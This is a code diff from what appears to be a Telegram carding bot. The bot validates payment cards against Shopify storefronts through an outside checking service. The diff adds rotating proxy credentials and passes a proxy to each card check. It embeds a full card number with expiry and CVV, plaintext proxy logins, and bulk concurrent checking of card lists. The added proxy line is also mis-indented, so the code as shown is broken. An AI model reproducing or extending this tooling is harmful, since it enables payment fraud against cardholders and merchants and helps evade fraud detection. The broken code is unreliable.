@@ -2758,7 +2758,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
         "https://auto-shopify-6cz4.onrender.com/index.php"
         f"?site={site_input}"
         "&cc=4312311807552605|08|2031|631"
-        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        "&proxy=qhlpirsk-5325:96zjmb7awmom@p.webshare.io:80"
     )
 
     try:
@@ -2922,7 +2922,7 @@ API_CHECK_TEMPLATE = (
     "https://auto-shopify-6cz4.onrender.com/index.php"
     "?site={site}"
     "&cc={card}"
-    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+    "&proxy=qhlpirsk-5338:96zjmb7awmom@p.webshare.io:80"
 )
 
 # ===== Main Command =====
@@ -3543,12 +3543,12 @@ from telegram import Update
 from html import escape
 
 # ===== Shopify check request =====
-async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
+async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str):
     # Ensure HTTPS
     if not site.startswith("http://") and not site.startswith("https://"):
         site = "https://" + site
 
-    url = f"{base_url}?site={site}&cc={card}"
+    url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
     try:
         r = await session.get(url, timeout=55)  # ✅ 55s timeout
         data = r.json()
@@ -3590,11 +3590,13 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     }
 
     async with httpx.AsyncClient() as session:
+    proxy = "qhlpirsk-5331:96zjmb7awmom@p.webshare.io:80"
+
 
         async def check_one(card, site):
             card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
             card_str = card_str.replace(" ", "")
-            resp, status, price, gateway = await check_card(session, base_url, site, card_str)
+            resp, status, price, gateway = await check_card(session, base_url, site, card_str, proxy)
             resp_str = str(resp).strip()
             resp_upper = resp_str.upper().replace(" ", "_")
 
